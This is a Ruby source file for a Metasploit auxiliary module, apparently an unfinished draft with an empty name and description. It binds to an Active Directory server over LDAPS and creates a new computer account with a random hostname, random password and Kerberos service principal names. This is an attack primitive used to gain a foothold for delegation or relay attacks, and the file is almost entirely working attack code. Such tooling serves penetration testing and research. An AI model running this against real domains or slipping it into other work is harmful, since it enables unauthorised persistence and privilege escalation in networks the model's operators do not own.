##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'References' => [
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          # TODO: check on adding an AddUser action
          ['AddComputer', { 'Description' => 'Add a new Computer' }]
        ],
        'DefaultAction' => 'AddComputer',
        'DefaultOptions' => {
          'SSL' => true,
        },
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
    ])
  end

  def random_hostname(prefix: 'DESKTOP')
    "#{prefix}-#{Rex::Text::rand_base(8, '', ('A' .. 'Z').to_a + ('0' .. '9').to_a)}"
  end

  def run
    print_status("#{peer} Connecting...")
    ldap_connect do |ldap|
      unless ldap.get_operation_result.code == 0
        fail_with(Failure::NoAccess, "Failed to bind to the remote server (#{ldap.get_operation_result.message})")
      end

      hostname = random_hostname
      base_dn = discover_base_dn(ldap)
      computer_group = "CN=Computers,#{base_dn}"
      computer_dn = "CN=#{hostname},#{computer_group}"

      print_status("Adding: #{hostname}")

      domain = 'MSFLAB.LOCAL'
      password = Rex::Text::rand_text_alphanumeric(32)
      spns = [
        "HOST/#{hostname}",
        "HOST/#{hostname}.#{domain}",
        "RestrictedKrbHost/#{hostname}",
        "RestrictedKrbHost/#{hostname}.#{domain}"
      ]
      ucd = {
        'dnsHostName' => "#{hostname}.#{domain}",
        # http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm
        'userAccountControl' => '4096',
        'servicePrincipalName' => spns,
        'sAMAccountName' => "#{hostname}$",
        'unicodePwd' => "\"#{password}\"".encode('UTF-16LE').force_encoding('ASCII-8BIT'),
        'objectClass' => ['top','person','organizationalPerson','user','computer']
      }
      result = ldap.add(dn: computer_dn, attributes: ucd)
      print_status result.inspect
    end
  end
end
